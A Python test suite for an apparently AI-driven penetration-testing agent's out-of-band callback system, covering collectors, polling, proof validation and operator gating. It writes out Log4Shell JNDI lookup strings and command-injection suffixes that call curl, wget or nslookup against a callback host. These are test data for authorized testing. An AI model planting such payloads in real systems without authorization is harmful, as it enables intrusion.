"""OOB callback collectors, payload templates, correlation, gating and graph facts.

Ports the Vanguard ``aegis-vanguard/tests/test_oob.py`` cases (probe minting,
payload hints, lenient parsing, polling, config gating) to the generic
``http_poll`` provider. No network: every poll goes through a fake transport.
"""

import asyncio
import json
from types import SimpleNamespace
from urllib.parse import parse_qs, unquote, urlsplit

import pytest
from app.services import interactsh_service, oob_collectors
from app.services.agent import attack_graph as g
from app.services.agent.evidence_store import evidence_store
from app.services.agent.oob_callback_workflow import (
    CALLBACK_HOST_PLACEHOLDER,
    run_callback_workflow,
)
from app.services.agent.oob_payload_templates import (
    JNDI_VARIANTS,
    cmdi_callback_in_request,
    cmdi_suffix,
    jndi_template,
    plan_oob_cmdi_command,
)
from app.services.agent.proof_policy import validate_proof
from app.services.oob_collectors import (
    HttpPollCollector,
    InteractshCollector,
    correlate,
    get_collector,
    parse_interactions,
)

DOMAIN = "oob.lab.example"
POLL = "https://collector.lab.example/poll"
T = "https://app.test"


class FakeCollectorHTTP:
    """Fake collector: stores hits per token; can misbehave and return all hits."""

    def __init__(self, *, ignore_token_filter=False, wrap="interactions"):
        self.hits = []
        self.calls = []
        self.ignore_token_filter = ignore_token_filter
        self.wrap = wrap

    def hit(self, token, protocol="dns", **extra):
        self.hits.append({"protocol": protocol, "full-id": f"{token}.{DOMAIN}",
                          "remote-address": "203.0.113.9", **extra})

    def __call__(self, url, headers, timeout):
        self.calls.append((url, dict(headers)))
        token = parse_qs(urlsplit(url).query).get("token", [""])[0]
        items = self.hits if self.ignore_token_filter else [
            h for h in self.hits if token in json.dumps(h)]
        return {self.wrap: list(items)} if self.wrap else list(items)


def _collector(transport=None, **kw):
    return HttpPollCollector(domain=DOMAIN, poll_url=POLL, transport=transport or FakeCollectorHTTP(), **kw)


def _settings(**overrides):
    base = dict(AEGIS_OOB_PROVIDER="interactsh", AEGIS_OOB_DOMAIN="", AEGIS_OOB_POLL_URL="",
                AEGIS_OOB_POLL_KEY=None)
    base.update(overrides)
    return SimpleNamespace(**base)


# ---------------------------------------------------------------- gating / config

def test_disabled_without_config_is_structured():
    reg = HttpPollCollector(domain="", poll_url="").register()
    assert reg["success"] is False and "AEGIS_OOB_DOMAIN" in reg["error"]
    assert HttpPollCollector(domain="bad domain", poll_url=POLL).register()["success"] is False
    assert HttpPollCollector(domain=DOMAIN, poll_url="file:///etc/x").register()["success"] is False


def test_enabled_with_config():
    reg = _collector().register()
    assert reg["success"] and reg["provider"] == "http_poll" and reg["reused"] is False


# ---------------------------------------------------------------- provider selection

def test_default_provider_is_interactsh():
    assert isinstance(get_collector(_settings()), InteractshCollector)
    assert isinstance(get_collector(_settings(AEGIS_OOB_PROVIDER="")), InteractshCollector)


def test_http_poll_selected_by_settings_and_aliases():
    for name in ("http_poll", "webhook", "HTTP_POLL"):
        c = get_collector(_settings(AEGIS_OOB_PROVIDER=name, AEGIS_OOB_DOMAIN=DOMAIN,
                                    AEGIS_OOB_POLL_URL=POLL))
        assert isinstance(c, HttpPollCollector) and c.domain == DOMAIN
    same = get_collector(_settings(AEGIS_OOB_PROVIDER="http_poll", AEGIS_OOB_DOMAIN=DOMAIN,
                                   AEGIS_OOB_POLL_URL=POLL))
    assert same is get_collector(_settings(AEGIS_OOB_PROVIDER="webhook", AEGIS_OOB_DOMAIN=DOMAIN,
                                           AEGIS_OOB_POLL_URL=POLL))


def test_unknown_provider_refused():
    with pytest.raises(ValueError):
        get_collector(_settings(AEGIS_OOB_PROVIDER="canarytokens"))


def test_settings_declare_operator_fields():
    from app.core.config import Settings

    fields = Settings.model_fields
    for name in ("AEGIS_OOB_PROVIDER", "AEGIS_OOB_DOMAIN", "AEGIS_OOB_POLL_URL", "AEGIS_OOB_POLL_KEY",
                 "AEGIS_INTERACTSH_SERVER", "AEGIS_INTERACTSH_TOKEN"):
        assert name in fields
    assert fields["AEGIS_OOB_PROVIDER"].default == "interactsh"


def test_workflow_uses_settings_provider_and_ignores_model_server(monkeypatch):
    transport = FakeCollectorHTTP()
    collector = _collector(transport)
    seen = {}
    real_register = collector.register

    def register(server=None, token=None):
        seen["args"] = (server, token)
        return real_register(server, token)

    collector.register = register
    monkeypatch.setattr(oob_collectors, "get_collector", lambda *a, **k: collector)
    _no_sleep(monkeypatch)
    result = asyncio.run(run_callback_workflow(_Manager(), url=T + "/fetch?url=x", field="url",
                                               server="attacker.example", token="t0k",
                                               poll_attempts=1))
    assert result["provider"] == "http_poll"
    assert seen["args"] == (None, None)


def test_workflow_reports_bad_provider(monkeypatch):
    def boom(*a, **k):
        raise ValueError("unsupported AEGIS_OOB_PROVIDER 'x'")

    monkeypatch.setattr(oob_collectors, "get_collector", boom)
    result = asyncio.run(run_callback_workflow(_Manager(), url=T + "/f"))
    assert result["success"] is False and "AEGIS_OOB_PROVIDER" in result["error"]


# ---------------------------------------------------------------- interactsh operator default

def test_interactsh_operator_default_server_and_token(monkeypatch):
    monkeypatch.setenv("AEGIS_INTERACTSH_SERVER", "oob.corp.example")
    monkeypatch.setenv("AEGIS_INTERACTSH_TOKEN", "operator-token")
    assert interactsh_service.operator_defaults() == ("oob.corp.example", "operator-token")
    # A model-supplied server keeps only a model-supplied token.
    assert interactsh_service.operator_defaults("other.example", None) == ("other.example", None)
    calls = []
    monkeypatch.setattr(interactsh_service, "_rpc_enabled", lambda: True)
    monkeypatch.setattr(interactsh_service, "_rpc_call",
                        lambda op, **kw: calls.append((op, kw)) or {"success": False})
    interactsh_service.register()
    interactsh_service.ensure_session()
    assert calls == [("register", {"server": "oob.corp.example", "token": "operator-token"}),
                     ("ensure_session", {"server": "oob.corp.example", "token": "operator-token"})]


def test_interactsh_unchanged_without_operator_default(monkeypatch):
    monkeypatch.delenv("AEGIS_INTERACTSH_SERVER", raising=False)
    monkeypatch.delenv("AEGIS_INTERACTSH_TOKEN", raising=False)
    assert interactsh_service.operator_defaults() == (None, None)
    assert interactsh_service.operator_defaults("s.example", "t") == ("s.example", "t")


# ---------------------------------------------------------------- probe minting

def test_new_probe_unique_and_hosted_under_domain():
    c = _collector()
    p1, p2 = c.register(), c.register()
    assert p1["session_id"] != p2["session_id"]
    assert p1["payload_domain"] != p2["payload_domain"]
    assert p1["payload_domain"].endswith("." + DOMAIN)
    token = p1["payload_domain"].split(".")[0]
    assert len(token) == 16 and p1["payload_url"] == f"http://{token}.{DOMAIN}/"


# ---------------------------------------------------------------- payload templates (hints)

def test_payload_templates_cover_vanguard_hints():
    host = "abc.oob.lab.example"
    for variant in JNDI_VARIANTS:
        tpl = jndi_template(variant)
        assert CALLBACK_HOST_PLACEHOLDER in tpl and tpl.startswith("${") and len(tpl) < 120
        assert host in tpl.replace(CALLBACK_HOST_PLACEHOLDER, host)
    assert jndi_template("plain") == "${jndi:ldap://{{callback_host}}/p}"
    assert len(JNDI_VARIANTS) <= 8
    with pytest.raises(ValueError):
        jndi_template("${jndi:ldap://attacker}")
    assert cmdi_suffix("posix_subshell", "curl") == "$(curl -s -o /dev/null http://{{callback_host}}/c)"
    assert cmdi_suffix("posix_separator", "wget") == ";wget -q -O /dev/null http://{{callback_host}}/w;"
    assert cmdi_suffix("windows_separator", "curl") == "&curl -s http://{{callback_host}}/c&"
    assert cmdi_suffix("posix_subshell") == "$(nslookup {{callback_host}})"
    with pytest.raises(ValueError):
        cmdi_suffix("windows_separator", "wget")
    with pytest.raises(ValueError):
        cmdi_suffix("posix_subshell", "bash")
    field, tpl = plan_oob_cmdi_command(T + "/ping?host=localhost", parameter="host",
                                       shell="posix_subshell", command="curl")
    assert field == "host" and tpl.startswith("localhost$(curl ")


def test_cmdi_matcher_requires_command_next_to_host():
    d = "tok123.oob.lab.example"
    assert cmdi_callback_in_request(f"host=localhost$(nslookup+{d})", d)
    assert cmdi_callback_in_request(f"host=x$(curl+-s+-o+/dev/null+http://{d}/c)", d)
    assert cmdi_callback_in_request(f"host=x;wget -q -O /dev/null http://{d}/w;", d)
    assert not cmdi_callback_in_request(f"url=http://{d}/", d)
    assert not cmdi_callback_in_request("${jndi:ldap://" + d + "/p}", d)
    assert not cmdi_callback_in_request(f"curl http://other.example/{d}", d)


# ---------------------------------------------------------------- parsing

def test_parse_list_and_wrapped_and_alternate_keys():
    raw_list = [{"protocol": "dns", "remote-address": "1.2.3.4", "timestamp": "t"}]
    assert len(parse_interactions(raw_list)) == 1
    wrapped = {"interactions": [{"proto": "http", "remote_addr": "5.6.7.8"}]}
    got = parse_interactions(wrapped)
    assert got[0]["protocol"] == "http" and got[0]["remote_address"] == "5.6.7.8"
    for key in ("data", "results", "hits"):
        rows = parse_interactions({key: [{"type": "DNS", "source-ip": "9.9.9.9", "ts": "1",
                                          "q": "abc.oob"}]})
        assert rows[0]["protocol"] == "dns" and rows[0]["remote_address"] == "9.9.9.9"
        assert rows[0]["timestamp"] == "1" and rows[0]["raw_request"] == "abc.oob"
    assert parse_interactions({"unexpected": 1}) == []
    assert parse_interactions("nope") == []
    assert parse_interactions([1, "x", None]) == []
    assert parse_interactions([{}])[0]["protocol"] == "http"


# ---------------------------------------------------------------- polling

def test_poll_returns_correlated_interactions_with_token_and_bearer():
    transport = FakeCollectorHTTP()
    c = _collector(transport, poll_key="sekret")
    reg = c.register()
    token = reg["payload_domain"].split(".")[0]
    transport.hit(token, "dns")
    polled = c.poll(reg["session_id"])
    assert polled["success"] and polled["new_interactions"] == 1
    assert polled["interactions"][0]["protocol"] == "dns"
    assert token in polled["interactions"][0]["unique_id"]
    url, headers = transport.calls[-1]
    assert f"token={token}" in url and headers["Authorization"] == "Bearer sekret"
    # Only new interactions on the next poll.
    assert c.poll(reg["session_id"])["interactions"] == []
    transport.hit(token, "http")
    assert [i["protocol"] for i in c.poll(reg["session_id"])["interactions"]] == ["http"]


def test_poll_without_key_sends_no_authorization():
    transport = FakeCollectorHTTP()
    c = _collector(transport)
    c.poll(c.register()["session_id"])
    assert "Authorization" not in transport.calls[-1][1]


def test_poll_errors_never_raise():
    def boom(url, headers, timeout):
        raise ConnectionError("blocked")

    c = _collector(boom)
    reg = c.register()
    polled = c.poll(reg["session_id"])
    assert polled["success"] is False and polled["interactions"] == []
    assert c.poll("")["success"] is False
    assert c.poll("hp-unknown")["success"] is False
    assert c.stop(reg["session_id"])["success"] and c.poll(reg["session_id"])["success"] is False


def test_per_probe_correlation_with_a_collector_that_ignores_the_filter():
    transport = FakeCollectorHTTP(ignore_token_filter=True, wrap="hits")
    c = _collector(transport)
    a, b = c.register(), c.register()
    token_a = a["payload_domain"].split(".")[0]
    transport.hit(token_a, "dns")
    transport.hits.append({"protocol": "http", "remote-address": "198.51.100.1"})  # no token at all
    got_b = c.poll(b["session_id"])
    assert got_b["interactions"] == [] and got_b["uncorrelated_dropped"] == 2
    got_a = c.poll(a["session_id"])
    assert len(got_a["interactions"]) == 1 and got_a["uncorrelated_dropped"] == 1


def test_correlate_rewrites_unique_id_to_token():
    rows = parse_interactions([{"protocol": "dns", "id": 42, "raw": "Q abc123def.oob"}])
    kept, dropped = correlate(rows, "abc123def")
    assert dropped == 0 and kept[0]["unique_id"] == "abc123def" and "_source" not in kept[0]


# ---------------------------------------------------------------- workflow end to end

class _Manager:
    def __init__(self, brain=None):
        if brain is not None:
            self._engagement_brain = brain

    async def _http_exchange(self, method, url, headers=None, body=None, **kwargs):
        exchange = {
            "request": {"method": method, "url": url, "headers": headers or {}, "body": body or ""},
            "response": {"status": 200, "url": url, "headers": {}, "body": "ok"},
        }
        eid = evidence_store(self).record("http_exchange", exchange, target=url,
                                          hypothesis_id=kwargs.get("hypothesis_id", ""), success=True)
        return {**exchange, "evidence_id": eid, "_body_text": "ok"}


def _no_sleep(monkeypatch):
    async def no_sleep(_s):
        return None

    monkeypatch.setattr("app.services.agent.oob_callback_workflow.asyncio.sleep", no_sleep)


class _HitOnPoll(FakeCollectorHTTP):
    """Simulate the target calling back once the probe is planted."""

    def __init__(self, protocol="dns", **kw):
        super().__init__(**kw)
        self.protocol = protocol

    def __call__(self, url, headers, timeout):
        token = parse_qs(urlsplit(url).query).get("token", [""])[0]
        if not self.hits:
            self.hit(token, self.protocol)
        return super().__call__(url, headers, timeout)


def _run(manager, collector, **kw):
    return asyncio.run(run_callback_workflow(manager, collector=collector, poll_attempts=2, **kw))


def test_jndi_header_callback_proves_outbound_lookup_not_rce(monkeypatch):
    _no_sleep(monkeypatch)
    manager = _Manager()
    result = _run(manager, _collector(_HitOnPoll("dns")), url=T + "/api/login", location="header",
                  field="User-Agent", value_template=jndi_template("lower"), payload_label="jndi:lower")
    assert result["callback_observed"] and result["proof"]["kind"] == "oob_callback"
    store = evidence_store(manager)
    plant = store.records[result["proof"]["plant_id"]]
    ua = plant["payload"]["request"]["headers"]["User-Agent"]
    assert ua.startswith("${${lower:j}ndi:") and result["payload_domain"] in ua
    ssrf = SimpleNamespace(vulnerability_class="ssrf", title="Outbound JNDI lookup from User-Agent",
                           description="The server performed a JNDI lookup of the callback host.",
                           target=T + "/api/login", evidence_ids=[], nonce="")
    assert validate_proof(store, ssrf, result["proof"], result["evidence_ids"]) == (True, "")
    rce = SimpleNamespace(vulnerability_class="command_injection", title="Log4Shell command injection",
                          description="", target=T + "/api/login", evidence_ids=[], nonce="")
    ok, why = validate_proof(store, rce, result["proof"], result["evidence_ids"])
    assert not ok and "curl" in why


def test_jndi_ldap_protocol_callback_is_accepted(monkeypatch):
    _no_sleep(monkeypatch)
    manager = _Manager()
    result = _run(manager, _collector(_HitOnPoll("ldap")), url=T + "/q?x=1", location="query",
                  field="x", value_template=jndi_template("plain"))
    cand = SimpleNamespace(vulnerability_class="ssrf", title="Outbound JNDI lookup", description="",
                           target=T + "/q", evidence_ids=[], nonce="")
    assert validate_proof(evidence_store(manager), cand, result["proof"], result["evidence_ids"])[0]


def test_value_template_rejected_for_raw_and_query_template():
    from app.services.agent.oob_callback_workflow import _inject_callback

    for location in ("raw", "query_template"):
        with pytest.raises(ValueError):
            _inject_callback(url=T + "/x", payload_url="http://h/", location=location, field="a",
                             headers=None, body="{{callback_url}}",
                             value_template=jndi_template("plain"), payload_host="h")


def test_curl_cmdi_callback_confirms_command_injection(monkeypatch):
    _no_sleep(monkeypatch)
    manager = _Manager()
    url = T + "/ping?host=localhost"
    field, tpl = plan_oob_cmdi_command(url, parameter="host", shell="posix_subshell", command="curl")
    result = _run(manager, _collector(_HitOnPoll("http")), url=url, location="query_template",
                  field=field, body=tpl)
    store = evidence_store(manager)
    planted = unquote(store.records[result["proof"]["plant_id"]]["payload"]["request"]["url"])
    assert "$(curl+-s+-o+/dev/null+http://" + result["payload_domain"] in planted
    cand = SimpleNamespace(vulnerability_class="command_injection", title="Blind command injection in ping",
                           description="", target=T + "/ping", evidence_ids=[], nonce="")
    assert validate_proof(store, cand, result["proof"], result["evidence_ids"]) == (True, "")


def test_uncorrelated_hits_never_become_proof(monkeypatch):
    _no_sleep(monkeypatch)
    transport = FakeCollectorHTTP(ignore_token_filter=True)
    transport.hit("0123456789abcdef", "dns")  # another probe's callback
    result = _run(_Manager(), _collector(transport), url=T + "/fetch?u=1", field="u")
    assert result["callback_observed"] is False and result["proof"] is None


def test_interactsh_default_path_still_used(monkeypatch):
    calls = []
    monkeypatch.setattr(interactsh_service, "register",
                        lambda server=None, token=None: calls.append(("register", server, token))
                        or {"success": False, "error": "interactsh-client not installed"})
    monkeypatch.setattr(oob_collectors, "get_collector", lambda *a, **k: get_collector(_settings()))
    result = asyncio.run(run_callback_workflow(_Manager(), url=T + "/f", server="s.example", token="t"))
    assert calls == [("register", "s.example", "t")]
    assert result == {"success": False, "error": "interactsh-client not installed",
                      "callback_observed": False}


# ---------------------------------------------------------------- attack-graph facts

def _graph_brain():
    from app.services.agent.engagement_brain import EngagementBrain

    brain = EngagementBrain(target=T)
    fact = g.record_fact(brain, kind="observation", summary="fetch takes a url parameter")
    intent = g.add_intent(brain, objective="blind SSRF via url", test_type="ssrf",
                          target=T + "/fetch?url=x", parameter="url", location="query",
                          parents=[fact["id"]])
    return brain, intent


def test_callback_recorded_as_fact_under_intent(monkeypatch):
    _no_sleep(monkeypatch)
    brain, intent = _graph_brain()
    manager = _Manager(brain.to_dict())
    result = _run(manager, _collector(_HitOnPoll("dns")), url=T + "/fetch?url=x", field="url",
                  intent_id=intent["id"])
    gf = result["graph_fact"]
    assert gf["kind"] == "callback" and gf["parents"] == [intent["id"]]
    from app.services.agent.engagement_brain import engagement_brain_from_dict

    saved = engagement_brain_from_dict(manager._engagement_brain)
    fact = g.get_fact(saved, gf["id"])
    assert result["proof"]["register_id"] in fact["evidence_ids"]
    assert result["proof"]["poll_id"] in fact["evidence_ids"]
    assert fact["data"]["provider"] == "http_poll" and fact["data"]["callback_observed"] is True
    # Evidence records are still written; the fact is in addition to them.
    assert evidence_store(manager).records[result["proof"]["poll_id"]]["kind"] == "oob_poll"
    g.claim_intent(saved, intent["id"], "ssrf")
    assert g.complete_intent(saved, intent["id"], "ssrf", result_facts=[gf["id"]])["status"] == "done"


def test_silent_window_recorded_as_observation_via_coverage_cell(monkeypatch):
    _no_sleep(monkeypatch)
    brain, intent = _graph_brain()
    assert intent["coverage_cell_id"]
    manager = _Manager(brain.to_dict())
    result = _run(manager, _collector(FakeCollectorHTTP()), url=T + "/fetch?url=x", field="url",
                  coverage_cell_id=intent["coverage_cell_id"])
    gf = result["graph_fact"]
    assert result["callback_observed"] is False and gf["kind"] == "observation"
    assert gf["parents"] == [intent["id"]]


def test_unknown_intent_does_not_block_proof(monkeypatch):
    _no_sleep(monkeypatch)
    brain, _ = _graph_brain()
    manager = _Manager(brain.to_dict())
    result = _run(manager, _collector(_HitOnPoll()), url=T + "/fetch?url=x", field="url",
                  intent_id="intent-missing")
    assert result["proof"] and "unknown intent" in result["graph_fact"]["error"]


def test_no_fact_without_intent_or_cell(monkeypatch):
    _no_sleep(monkeypatch)
    manager = _Manager({"target": T})
    result = _run(manager, _collector(_HitOnPoll()), url=T + "/fetch?url=x", field="url")
    assert "graph_fact" not in result
    assert not (manager._engagement_brain.get("facts") or [])


# ---------------------------------------------------------------- operator grant

def test_grant_gates_workflow_and_new_templates(monkeypatch):
    from app.services.agent.tools import ASMToolsManager

    manager = ASMToolsManager()
    called = []

    async def fake_workflow(*a, **k):
        called.append(k)
        return {"success": True}

    monkeypatch.setattr("app.services.agent.oob_callback_workflow.run_callback_workflow", fake_workflow)
    for args in ({"url": T + "/x", "jndi_variant": "plain", "location": "header", "field": "User-Agent"},
                 {"url": T + "/ping?host=a", "field": "host", "cmdi_shell": "posix_subshell",
                  "cmdi_command": "curl"}):
        denied = asyncio.run(manager.execute("run_oob_callback_workflow", args))
        assert denied["error"] == "oob_callbacks_not_authorized"
    assert called == []
    assert manager._oob_callbacks_allowed is False


def test_tool_validates_template_choices():
    from app.services.agent.tools import ASMToolsManager

    manager = ASMToolsManager()
    out = json.loads(asyncio.run(manager.run_oob_callback_workflow(
        url=T + "/x", jndi_variant="plain", cmdi_shell="posix_subshell")))
    assert out["success"] is False and "choose one" in out["error"]
    out = json.loads(asyncio.run(manager.run_oob_callback_workflow(url=T + "/x", cmdi_command="curl")))
    assert "requires cmdi_shell" in out["error"]
    out = json.loads(asyncio.run(manager.run_oob_callback_workflow(
        url=T + "/x", jndi_variant="plain", location="raw", body="x")))
    assert out["success"] is False and "jndi_variant" in out["error"]
    out = json.loads(asyncio.run(manager.run_oob_callback_workflow(
        url=T + "/ping?host=a", field="host", cmdi_shell="windows_separator", cmdi_command="wget")))
    assert out["success"] is False and "wget" in out["error"]


# ---------------------------------------------------------------- facade (other callers)

def _use_http_poll(monkeypatch, collector):
    monkeypatch.setattr(oob_collectors, "get_collector", lambda *a, **k: collector)


def test_execute_interactsh_uses_the_operator_collector(monkeypatch):
    import asyncio
    import json as _json

    from app.services.mcp.server import MCPServer

    collector = _collector()
    _use_http_poll(monkeypatch, collector)
    server = MCPServer.__new__(MCPServer)
    reg = asyncio.run(server._execute_interactsh("register -s evil.example -t stolen"))
    body = _json.loads(reg["output"])
    assert reg["success"] and body["provider"] == "http_poll"
    assert body["payload_domain"].endswith("." + DOMAIN) and body["session_id"].startswith("hp-")
    listed = _json.loads(asyncio.run(server._execute_interactsh("list"))["output"])
    assert listed["count"] == 1
    assert _json.loads(asyncio.run(server._execute_interactsh("health"))["output"])["success"]
    polled = asyncio.run(server._execute_interactsh(f"poll {body['session_id']}"))
    assert _json.loads(polled["output"])["provider"] == "http_poll"
    assert asyncio.run(server._execute_interactsh(f"stop {body['session_id']}"))["success"]


def test_model_server_and_token_only_reach_interactsh(monkeypatch):
    from app.services import interactsh_service

    seen = []
    monkeypatch.setattr(interactsh_service, "register",
                        lambda server=None, token=None: seen.append((server, token)) or {"success": True})
    _use_http_poll(monkeypatch, oob_collectors._INTERACTSH)
    oob_collectors.oob_register("s.example", "t1")
    assert seen == [("s.example", "t1")]
    collector = _collector()
    _use_http_poll(monkeypatch, collector)
    reg = oob_collectors.oob_register("s.example", "t1")
    assert reg["provider"] == "http_poll" and seen == [("s.example", "t1")]


def test_poll_and_stop_route_by_session_id(monkeypatch):
    from app.services import interactsh_service

    monkeypatch.setattr(interactsh_service, "poll", lambda sid: {"success": True, "via": "interactsh"})
    collector = _collector()
    _use_http_poll(monkeypatch, collector)
    assert oob_collectors.oob_poll("ish-123")["via"] == "interactsh"
    reg = collector.register()
    assert oob_collectors.oob_poll(reg["session_id"])["provider"] == "http_poll"


def test_ensure_session_reuses_one_shared_probe(monkeypatch):
    collector = _collector()
    _use_http_poll(monkeypatch, collector)
    first = oob_collectors.oob_ensure_session()
    second = oob_collectors.oob_ensure_session()
    assert first["session_id"] == second["session_id"] and second["reused"] is True
    collector.stop(first["session_id"])
    assert oob_collectors.oob_ensure_session()["session_id"] != first["session_id"]


def test_hunter_brief_and_payload_hints_use_the_operator_collector(monkeypatch):
    from app.services.agent.hunter_brief import _live_oob_lines
    from app.services.agent.injection_payloads import generate_payloads

    collector = _collector()
    _use_http_poll(monkeypatch, collector)
    lines = "\n".join(_live_oob_lines())
    assert "LIVE OOB session_id=hp-" in lines and DOMAIN in lines
    out = generate_payloads("ssrf", max_payloads=200)
    assert out["interactsh"]["session_id"].startswith("hp-")
    assert out["collaborator_url"].endswith("." + DOMAIN)
    assert any(out["collaborator_url"] in p for p in out["payloads"])
    assert not any("COLLABORATOR" in p for p in out["payloads"])
